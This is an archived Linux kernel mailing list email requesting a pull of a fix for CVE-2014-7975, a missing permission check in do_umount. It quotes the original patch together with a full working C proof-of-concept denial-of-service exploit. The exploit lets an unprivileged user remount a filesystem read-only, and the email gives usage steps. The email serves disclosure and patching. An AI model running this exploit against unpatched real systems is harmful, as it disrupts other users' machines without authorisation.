Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1754611AbaJNFeM (ORCPT <rfc822;w@1wt.eu>);
	Tue, 14 Oct 2014 01:34:12 -0400
Received: from mail-la0-f42.google.com ([209.85.215.42]:61027 "EHLO
	mail-la0-f42.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1753208AbaJNFeJ (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Tue, 14 Oct 2014 01:34:09 -0400
MIME-Version: 1.0
In-Reply-To: <CALCETrVRhm1u6LEFSwtjNj_y=u9SbWoOP9t82C0Yq1zeAmRLpg@mail.gmail.com>
References: <a1480dcc3c706e309a88884723446f2e84fedd5b.1412796914.git.luto@amacapital.net>
 <CALCETrVRhm1u6LEFSwtjNj_y=u9SbWoOP9t82C0Yq1zeAmRLpg@mail.gmail.com>
From: Andy Lutomirski <luto@amacapital.net>
Date: Mon, 13 Oct 2014 22:33:46 -0700
Message-ID: <CALCETrWaMircwfJGWY4dyF647dz1VXyknRTond2r7H+NPScgLw@mail.gmail.com>
Subject: Re: [PATCH] fs: Add a missing permission check to do_umount
To: Al Viro <viro@zeniv.linux.org.uk>,
        "Eric W. Biederman" <ebiederm@xmission.com>,
        "security@kernel.org" <security@kernel.org>,
        Linus Torvalds <torvalds@linux-foundation.org>
Cc: Serge Hallyn <serge.hallyn@ubuntu.com>,
        Andy Lutomirski <luto@amacapital.net>, stable <stable@vger.kernel.org>,
        "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
        Linux FS Devel <linux-fsdevel@vger.kernel.org>
Content-Type: text/plain; charset=UTF-8
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

On Thu, Oct 9, 2014 at 3:36 PM, Andy Lutomirski <luto@amacapital.net> wrote:
> On Wed, Oct 8, 2014 at 12:37 PM, Andy Lutomirski <luto@amacapital.net> wrote:
>> Accessing do_remount_sb should require global CAP_SYS_ADMIN, but
>> only one of the two call sites was appropriately protected.
>>
>> Fixes CVE-2014-7975.
>
> Due to my ineptitude, the cat is well and truly out of the bag on this
> one, complete with PoC.

Beuller?

Linus, can you pull this?

The following changes since commit a1480dcc3c706e309a88884723446f2e84fedd5b:

  fs: Add a missing permission check to do_umount (2014-10-08 12:32:47 -0700)

are available in the git repository at:

  git://git.kernel.org/pub/scm/linux/kernel/git/luto/linux.git CVE-2014-7975

for you to fetch changes up to a1480dcc3c706e309a88884723446f2e84fedd5b:

  fs: Add a missing permission check to do_umount (2014-10-08 12:32:47 -0700)

Thanks,
Andy

>
> This fix really ought to be safe.  Inside a mountns owned by a
> non-root user namespace, the namespace root almost always has
> MNT_LOCKED set (if it doesn't, then there's a bug, because rootfs
> could be exposed).  In that case, calling umount on "/" will return
> -EINVAL with or without this patch.
>
> Outside a userns, this patch will have no effect.  may_mount, required
> by umount, already checks
> ns_capable(current->nsproxy->mnt_ns->user_ns, CAP_SYS_ADMIN), so an
> additional capable(CAP_SYS_ADMIN) check will have no effect.
>
> That leaves anything that calls umount on "/" in a non-root userns
> while chrooted.  This is the case that is currently broken (it
> remounts ro, which shouldn't be allowed) and that my patch changes to
> -EPERM.  If anything relies on *that*, I'd be surprised.
>
> --Andy
>
>>
>> Cc: stable@vger.kernel.org
>> Signed-off-by: Andy Lutomirski <luto@amacapital.net>
>> ---
>>
>> *Sigh*
>>
>> Build the thing below and do something like:
>>
>> $ cd /dev/pts
>> $ remount_ro /dev
>>
>> /* remount_ro.c */
>> /* Copyright (c) 2014 Andrew Lutomirski.  All rights reserved. */
>>
>> #define _GNU_SOURCE
>> #include <unistd.h>
>> #include <sched.h>
>> #include <sys/types.h>
>> #include <sys/wait.h>
>> #include <fcntl.h>
>> #include <stdio.h>
>> #include <string.h>
>> #include <err.h>
>> #include <sys/mount.h>
>> #include <sys/syscall.h>
>> #include <sys/stat.h>
>>
>> #ifndef CLONE_NEWUSER
>> #define CLONE_NEWUSER 0x10000000
>> #endif
>>
>> static void set_map(const char *path, uid_t outer)
>> {
>>         char buf[1024];
>>         int fd = open(path, O_WRONLY);
>>         if (fd == -1)
>>                 err(1, "open map");
>>         sprintf(buf, "0 %ld 1", (long)outer);
>>         if (write(fd, buf, strlen(buf)) != strlen(buf))
>>                 err(1, "write map");
>>         close(fd);
>> }
>>
>> int main(int argc, char **argv)
>> {
>>   printf("remount_ro, a DoS by Andy Lutomirski\n");
>>   if (argc != 2) {
>>     printf("Usage: remount_ro TARGET_MOUNT\n");
>>     return 1;
>>   }
>>
>>   int origroot_fd;
>>   long uid = geteuid(), gid = getegid();
>>   char origcwd[16384];
>>   const char *target = argv[1];
>>
>>   if (unshare(CLONE_NEWUSER) != 0)
>>     err(1, "unshare(CLONE_NEWUSER)");
>>   if (unshare(CLONE_NEWNS) != 0)
>>     err(1, "unshare(CLONE_NEWNS)");
>>
>>   set_map("/proc/self/uid_map", uid);
>>   set_map("/proc/self/gid_map", gid);
>>
>>   if (mount("/", "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0)
>>     err(1, "MS_PRIVATE");
>>
>>   // Minimize required thought: just chroot to the target first.
>>   if (chroot(target) != 0)
>>     err(1, "chroot to target");
>>
>>   // Big song and dance to clear MNT_LOCKED on "/".
>>
>>   origroot_fd = open("/", O_RDONLY);
>>   if (origroot_fd == -1)
>>     err(1, "open");
>>
>>   if (!getcwd(origcwd, sizeof(origcwd)))
>>       err(1, "getcwd");
>>   if (!strncmp("(unreachable)", origcwd, 13))
>>     errx(1, "current directory must be under the target directory");
>>   if (!strcmp(origcwd, "/"))
>>     errx(1, "don't run from the target directory");
>>   if (mount("temporary_root", ".", "tmpfs", 0, NULL) != 0)
>>     err(1, "mount");
>>   if (chdir(origcwd) != 0)
>>     err(1, "chdir");
>>
>>   if (syscall(SYS_pivot_root, ".", ".") != 0)
>>     err(1, "pivot_root");
>>
>>   if (fchdir(origroot_fd) != 0)
>>     err(1, "fchdir");
>>   close(origroot_fd);
>>
>>   if (chroot(".") != 0)
>>     err(1, "chroot");
>>
>>   // That was fun.  Exploit time.
>>   if (umount2("/", MNT_FORCE) != 0)
>>     err(1, "umount");
>>   printf("Seems to have worked.  Have fun.\n");
>>
>>   return 0;
>> }
>>
>>  fs/namespace.c | 2 ++
>>  1 file changed, 2 insertions(+)
>>
>> diff --git a/fs/namespace.c b/fs/namespace.c
>> index ef42d9bee212..7f67b463a5b4 100644
>> --- a/fs/namespace.c
>> +++ b/fs/namespace.c
>> @@ -1356,6 +1356,8 @@ static int do_umount(struct mount *mnt, int flags)
>>                  * Special case for "unmounting" root ...
>>                  * we just try to remount it readonly.
>>                  */
>> +               if (!capable(CAP_SYS_ADMIN))
>> +                       return -EPERM;
>>                 down_write(&sb->s_umount);
>>                 if (!(sb->s_flags & MS_RDONLY))
>>                         retval = do_remount_sb(sb, MS_RDONLY, NULL, 0);
>> --
>> 1.9.3
>>
>
>
>
> --
> Andy Lutomirski
> AMA Capital Management, LLC



-- 
Andy Lutomirski
AMA Capital Management, LLC
